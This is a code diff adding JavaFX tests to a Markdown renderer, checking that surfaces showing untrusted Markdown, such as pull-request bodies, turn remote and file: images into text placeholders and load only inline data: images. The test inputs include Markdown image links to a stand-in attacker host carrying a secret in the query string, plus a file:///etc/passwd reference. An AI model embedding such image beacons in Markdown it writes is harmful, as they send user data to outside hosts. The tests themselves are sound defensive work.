@@ -105,4 +105,51 @@ class MarkdownRendererFxTest {
                 .orElseThrow();
         assertNull(link.getOnMouseClicked(), "no handler wired ⇒ link isn't clickable");
     }
+
+    // --- image policy on surfaces whose Markdown the user did not write ---
+
+    private static final String PIXEL = "data:image/png;base64,"
+            + "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+
+    private Node renderUntrusted(String md) throws Exception {
+        return FxTestSupport.callOnFx(() -> MarkdownRenderer.renderDocument(
+                MarkdownRenderer.parseToDocument(md), null, null, MarkdownRenderer.ImagePolicy.DATA_ONLY));
+    }
+
+    @Test
+    void anUntrustedSurfaceShowsARemoteImageAsAPlaceholderAndNeverCreatesAnImageView() throws Exception {
+        // Block image, inline image, and one behind a link: none may become a loading ImageView.
+        Node root = renderUntrusted("![logo](https://attacker.invalid/p.png?d=SECRET)\n\n"
+                + "text ![inline](http://attacker.invalid/i.png) more\n\n"
+                + "![local](file:///etc/passwd)\n");
+        assertTrue(collect(root, javafx.scene.image.ImageView.class).isEmpty(), "nothing is fetched");
+        List<String> labels =
+                collect(root, Label.class).stream().map(Label::getText).toList();
+        assertTrue(labels.contains("[image: logo] https://attacker.invalid/p.png?d=SECRET"), labels.toString());
+        assertTrue(labels.contains("[image: inline] http://attacker.invalid/i.png"), labels.toString());
+        assertTrue(labels.contains("[image: local] file:///etc/passwd"), labels.toString());
+    }
+
+    @Test
+    void anUntrustedSurfaceStillShowsASelfContainedDataImage() throws Exception {
+        Node root = renderUntrusted("![dot](" + PIXEL + ")\n");
+        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size());
+    }
+
+    @Test
+    void theDocumentPreviewKeepsLoadingItsImages() throws Exception {
+        // The default overloads are the document policy: a file: image still becomes an ImageView (it simply
+        // stays blank here, the file does not exist — nothing is fetched from a network in this test).
+        Node root = render("![pic](file:///nonexistent-editora-test/pic.png)\n");
+        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size());
+    }
+
+    @Test
+    void thePullRequestPaneRendersBodiesUnderTheDataOnlyPolicy() throws Exception {
+        java.lang.reflect.Method m = PrReviewPane.class.getDeclaredMethod("renderMarkdown", String.class);
+        m.setAccessible(true);
+        Node root = FxTestSupport.callOnFx(
+                () -> (Node) m.invoke(null, "![x](https://attacker.invalid/p.png)\n\n![ok](" + PIXEL + ")\n"));
+        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size(), "only the data: image");
+    }
 }
